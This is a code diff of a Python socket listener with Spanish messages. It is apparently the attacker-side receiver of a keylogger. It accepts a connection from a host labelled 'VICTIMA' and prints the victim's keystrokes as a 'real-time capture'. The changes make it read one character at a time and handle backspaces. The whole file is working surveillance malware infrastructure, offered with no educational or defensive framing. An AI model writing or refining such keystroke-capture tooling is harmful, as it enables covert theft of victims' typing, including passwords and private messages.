@@ -1,5 +1,4 @@
 import socket
-from datetime import datetime
 import time
 import threading
 import sys
@@ -41,52 +40,34 @@ time.sleep(0.6)
 sys.stdout.write('\r' + ' ' * 70 + '\r')
 sys.stdout.flush()
 
-hora_conexion = datetime.now().strftime("%H:%M:%S")
-print(f"[+] VICTIMA CONECTADA")
-print(f"    IP: {addr[0]}")
-print(f"    Puerto: {addr[1]}")
-print(f"    Hora: {hora_conexion}")
-print("\n" + "="*60)
-print("CAPTURA EN TIEMPO REAL:")
-print("="*60 + "\n")
+print(f"\n[+] CONEXION ESTABLECIDA")
+print(f"    {addr[0]}:{addr[1]}\n")
+print("CAPTURA EN TIEMPO REAL:\n")
 
 while True:
     try:
-        data = conn.recv(1024)
+        data = conn.recv(1)
         if not data:
-            print("\n\n" + "="*60)
-            print("[!] Conexion cerrada por la victima")
-            print("="*60)
+            print("\n\n[!] Conexion cerrada")
             break
 
-        texto = data.decode('utf-8', errors='ignore')
-        
-        texto = texto.replace('[ENTER]', '\n')
-        texto = texto.replace('[SPACE]', ' ')
-        texto = texto.replace('[BACK]', '[←]')
-        texto = texto.replace('[TAB]', '\t')
-        texto = texto.replace('[ESC]', '[ESC]')
-        texto = texto.replace('[shift]', '')
-        texto = texto.replace('[shift_r]', '')
-        texto = texto.replace('[caps_lock]', '')
-        texto = texto.replace('[ctrl]', '')
-        texto = texto.replace('[ctrl_r]', '')
-        texto = texto.replace('[alt]', '')
-        texto = texto.replace('[alt_r]', '')
-        texto = texto.replace('[cmd]', '')
-        
-        if texto.strip():
-            print(texto, end='', flush=True)
+        try:
+            caracter = data.decode('utf-8')
+            
+            if caracter == '\b':
+                sys.stdout.write('\b \b') 
+                sys.stdout.flush()
+            else:
+                sys.stdout.write(caracter)
+                sys.stdout.flush()
+        except:
+            pass
 
     except KeyboardInterrupt:
-        print("\n\n" + "="*60)
-        print("[!] Listener detenido manualmente")
-        print("="*60)
+        print("\n\n[!] Listener detenido manualmente")
         break
     except Exception as e:
-        print("\n\n" + "="*60)
-        print(f"[!] Error en conexion: {e}")
-        print("="*60)
+        print(f"\n\n[!] Error en conexion: {e}")
         break
 
 conn.close()
